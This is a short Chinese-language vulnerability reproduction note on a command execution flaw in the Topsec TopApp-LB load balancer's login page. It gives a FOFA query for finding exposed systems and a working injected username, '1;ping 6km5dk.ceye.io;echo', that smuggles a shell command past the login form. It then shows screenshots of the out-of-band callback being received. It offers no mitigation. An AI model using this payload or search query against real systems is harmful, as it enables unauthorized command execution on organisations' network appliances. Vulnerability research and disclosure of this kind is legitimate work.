# 天融信负载均衡TopApp-LB命令执行漏洞

## 漏洞描述

天融信负载均衡TopApp-LB系统存在任意命令执行

## 影响版本

天融信负载均衡TopApp-LB

## FOFA

> [!NOTE]
>
> app="天融信-TopApp-LB-负载均衡系统"

## 漏洞复现

登录界面中存在命令执行

账号:**1;ping 6km5dk.ceye.io;echo**

密码:**任意**

![](http://wikioss.peiqi.tech/vuln/trx-3.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)

成功收到请求

![](http://wikioss.peiqi.tech/vuln/trx-4.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)